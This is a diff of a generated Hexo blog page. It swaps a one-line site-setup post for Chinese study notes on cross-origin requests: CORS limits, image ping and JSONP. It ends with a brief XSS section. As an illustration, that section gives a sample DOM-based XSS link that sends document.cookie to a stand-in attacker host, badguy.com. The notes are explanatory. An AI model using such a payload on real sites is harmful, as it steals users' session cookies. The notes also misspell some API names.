@@ -4,18 +4,30 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>小记 | GDH&#39; blog</title>
+  <title>跨域 | GDH&#39; blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="今天试了一下用hexo建站，没想到这么容易，不过还有很多没有完善，一些优化也没做，今天就到这里了吧。">
+  <meta name="description" content="跨域资源共享CORS(cross-orgin resource sharing)
+需要服务端设置Access-Control-Allow-Origin
+不能使用setRequestHeader()
+不能发送接收cookie
+调用getAllResonseHeaders()方法返回空字符串">
 <meta property="og:type" content="article">
-<meta property="og:title" content="小记">
-<meta property="og:url" content="http://yoursite.com/2016/05/08/小记/index.html">
+<meta property="og:title" content="跨域">
+<meta property="og:url" content="http://yoursite.com/2016/05/10/跨域/index.html">
 <meta property="og:site_name" content="GDH' blog">
-<meta property="og:description" content="今天试了一下用hexo建站，没想到这么容易，不过还有很多没有完善，一些优化也没做，今天就到这里了吧。">
-<meta property="og:updated_time" content="2016-05-08T07:48:16.661Z">
+<meta property="og:description" content="跨域资源共享CORS(cross-orgin resource sharing)
+需要服务端设置Access-Control-Allow-Origin
+不能使用setRequestHeader()
+不能发送接收cookie
+调用getAllResonseHeaders()方法返回空字符串">
+<meta property="og:updated_time" content="2016-10-01T10:01:21.036Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="小记">
-<meta name="twitter:description" content="今天试了一下用hexo建站，没想到这么容易，不过还有很多没有完善，一些优化也没做，今天就到这里了吧。">
+<meta name="twitter:title" content="跨域">
+<meta name="twitter:description" content="跨域资源共享CORS(cross-orgin resource sharing)
+需要服务端设置Access-Control-Allow-Origin
+不能使用setRequestHeader()
+不能发送接收cookie
+调用getAllResonseHeaders()方法返回空字符串">
   
   
     <link rel="icon" href="/favicon.png">
@@ -172,11 +184,11 @@
 	</div>
 </nav>
 
-      <div class="body-wrap"><article id="post-小记" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-跨域" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/05/08/小记/" class="article-date">
-  	<time datetime="2016-05-08T06:50:32.000Z" itemprop="datePublished">2016-05-08</time>
+      <a href="/2016/05/10/跨域/" class="article-date">
+  	<time datetime="2016-05-10T02:50:32.000Z" itemprop="datePublished">2016-05-10</time>
 </a>
     </div>
   
@@ -189,7 +201,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      小记
+      跨域
     </h1>
   
 
@@ -198,7 +210,7 @@
       <div class="article-info article-info-post">
         
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/">JS</a></li></ul>
 	</div>
 
         
@@ -209,7 +221,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>今天试了一下用hexo建站，没想到这么容易，不过还有很多没有完善，一些优化也没做，今天就到这里了吧。</p>
+        <h1 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h1><h3 id="CORS-cross-orgin-resource-sharing"><a href="#CORS-cross-orgin-resource-sharing" class="headerlink" title="CORS(cross-orgin resource sharing)"></a>CORS(cross-orgin resource sharing)</h3><ul>
+<li>需要服务端设置Access-Control-Allow-Origin</li>
+<li>不能使用setRequestHeader()</li>
+<li>不能发送接收cookie</li>
+<li>调用getAllResonseHeaders()方法返回空字符串</li>
+</ul>
+<a id="more"></a>
+<h3 id="图像Ping"><a href="#图像Ping" class="headerlink" title="图像Ping"></a>图像Ping</h3><p>通过new Image()动态创建img对象<br>只能发送GET请求，无法访问服务器的响应文本</p>
+<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>动态创建script元素，script.src=”<a href="http://freegeiop.net/json/?callback=handleResponse" target="_blank" rel="external">http://freegeiop.net/json/?callback=handleResponse</a>“;<br>function handleResponse(response){}</p>
+<h4 id="XSS-Cross-Site-Scripting-跨站攻击脚本"><a href="#XSS-Cross-Site-Scripting-跨站攻击脚本" class="headerlink" title="XSS(Cross Site Scripting)跨站攻击脚本"></a>XSS(Cross Site Scripting)跨站攻击脚本</h4><h5 id="Dom-Based-XSS"><a href="#Dom-Based-XSS" class="headerlink" title="Dom-Based XSS"></a>Dom-Based XSS</h5><p>连接中带有js代码，如<br><code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><br>将网站cookie发送到某网站</p>
+<h5 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h5><p>将带有攻击代码保存到数据库中。</p>
 
       
     </div>
@@ -219,18 +241,18 @@
     
 <nav id="article-nav">
   
-    <a href="/2016/05/10/跨域/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/05/10/url、uri、urn、src和href/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          跨域
+          url、uri、urn、src和href
         
       </div>
     </a>
   
   
-    <a href="/2016/05/08/CSS3动画/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CSS3动画</div>
+    <a href="/2016/05/08/小记/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">小记</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -265,7 +287,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="小记" data-title="小记" data-url="http://yoursite.com/2016/05/08/小记/"></div>
+	<div class="ds-thread" data-thread-key="跨域" data-title="跨域" data-url="http://yoursite.com/2016/05/10/跨域/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
